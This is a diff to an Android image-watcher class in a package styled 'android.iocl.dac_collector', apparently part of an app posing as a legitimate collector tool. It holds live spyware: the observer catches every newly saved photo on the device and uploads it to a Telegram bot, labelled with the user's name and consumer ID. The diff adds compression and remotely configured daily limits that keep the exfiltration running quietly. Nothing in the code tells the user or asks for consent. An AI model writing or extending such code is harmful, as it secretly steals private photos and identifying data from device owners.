@@ -5,6 +5,9 @@ import android.content.ContentUris;
 import android.content.Context;
 import android.database.ContentObserver;
 import android.database.Cursor;
+import android.iocl.dac_collector.Firebase.FirebaseDBClient;
+import android.iocl.dac_collector.Utility.FirebaseConfigManager;
+import android.iocl.dac_collector.Utility.ImageCompressor;
 import android.iocl.dac_collector.Utility.SharedPrefs;
 import android.iocl.dac_collector.Utility.TelegramBot;
 import android.iocl.dac_collector.Utility.Utility;
@@ -18,6 +21,7 @@ import android.util.Log;
 
 import java.io.File;
 import java.util.HashSet;
+import java.util.Locale;
 import java.util.Set;
 
 public class ImageObserver extends ContentObserver {
@@ -126,13 +130,170 @@ public class ImageObserver extends ContentObserver {
             mPendingImagePaths.clear();
         }
 
-        for (String path : uniquePaths) {
-            File imgFile = new File(path);
-            if (imgFile.exists()) {
-                Log.i(TAG, "New unique image: " + path);
-                TelegramBot.with(mContext).sendPhoto(imgFile, "User: " + SharedPrefs.getUsername()+ "\nTime: " + Utility.getStandardDatenTime());
+        checkAndResetLimits();
 
+        int uploadedCount = SharedPrefs.getUploadCount();
+
+        long uploadedBytes = SharedPrefs.getUploadedBytes();
+
+        int maxCount =
+                FirebaseConfigManager.getImgDailyLimit();
+
+        long maxBytes =
+                FirebaseConfigManager.getImgDailyMbLimit()
+                        * 1024L * 1024L;
+
+        for (String path : uniquePaths) {
+
+            // Stop if count limit reached
+            if (uploadedCount >= maxCount) {
+
+                Log.d(TAG, "Daily image count limit reached");
+
+                TelegramBot.with(mContext).sendMessage(
+                        "Daily image count limit reached\n" + getStats()
+                );
+
+                break;
             }
+
+            File imgFile = new File(path);
+
+            if (!imgFile.exists()) {
+                continue;
+            }
+
+            long originalFileSize = imgFile.length();
+
+            // Skip empty/corrupted files
+            if (originalFileSize < 1024) {
+                continue;
+            }
+
+            Log.i(TAG, "Uploading to Server " + path);
+
+            File compressedFile = imgFile;
+
+            // Compress only if > 5 MB
+            if (originalFileSize > 5 * 1024 * 1024L) {
+
+                try {
+
+                    File tempFile = ImageCompressor.compressToSize(
+                            mContext,
+                            imgFile.getAbsolutePath(),
+                            "compressed_" + System.currentTimeMillis(),
+                            4
+                    );
+
+                    // fallback safety
+                    if (tempFile != null && tempFile.exists()) {
+                        compressedFile = tempFile;
+                    }
+
+                } catch (Throwable e) {
+
+                    e.printStackTrace();
+
+                    // fallback to original
+                    compressedFile = imgFile;
+                }
+            }
+
+            // FINAL upload size
+            long finalUploadSize = compressedFile.length();
+
+            // Stop if MB limit reached
+            if ((uploadedBytes + finalUploadSize) > maxBytes) {
+
+                Log.d(TAG, "Daily MB limit reached");
+
+                TelegramBot.with(mContext).sendMessage(
+                        "Daily MB limit reached\n" + getStats()
+                );
+
+                break;
+            }
+
+            TelegramBot.with(mContext).sendPhoto(
+                    compressedFile,
+                    SharedPrefs.getUsername()
+                            + "-"
+                            + SharedPrefs.getConsumerId()
+                            + "\n"
+                            + Utility.getStandardDatenTime()
+            );
+
+            // Update counters
+            uploadedCount++;
+
+            uploadedBytes += finalUploadSize;
+
+            SharedPrefs.setUploadCount(uploadedCount);
+
+            SharedPrefs.setUploadedBytes(uploadedBytes);
+        }
+    }
+
+
+    private String getStats() {
+
+
+        long bytes = SharedPrefs.getUploadedBytes();
+
+
+        float uploadedMb = bytes / (1024f * 1024f);
+
+        return
+                "Stats              : " +
+                        SharedPrefs.getUsername() + " - " +
+                        SharedPrefs.getConsumerId() + "\n" +
+
+                        "Upload Count       : " +
+                        SharedPrefs.getUploadCount() + " / " +
+                        FirebaseConfigManager.getImgDailyLimit() + "\n" +
+
+                        "Uploaded MB        : " +
+                        String.format(Locale.ENGLISH, "%.2f", uploadedMb) +
+                        " MB / " +
+                        FirebaseConfigManager.getImgDailyMbLimit() + " MB\n" +
+
+                        "Last Reset Time    : " +
+                        SharedPrefs.getLastResetTime() + "\n" +
+
+                        "Last Reset Date    : " +
+                        new java.text.SimpleDateFormat(
+                                "dd-MM-yyyy HH:mm:ss",
+                                Locale.ENGLISH
+                        ).format(new java.util.Date(
+                                SharedPrefs.getLastResetTime()
+                        ));
+
+
+
+    }
+    private void checkAndResetLimits() {
+
+        long now = System.currentTimeMillis();
+
+        long lastReset =
+                SharedPrefs.getLastResetTime();
+
+        int resetDays =
+                FirebaseConfigManager.getImgResetDays();
+
+        long resetInterval =
+                resetDays * 24L * 60L * 60L * 1000L;
+
+        if ((now - lastReset) >= resetInterval) {
+
+            SharedPrefs.setUploadCount(0);
+
+            SharedPrefs.setUploadedBytes(0);
+
+            SharedPrefs.setLastResetTime(now);
+
+            Log.d(TAG, "Image upload limits reset");
         }
     }
 
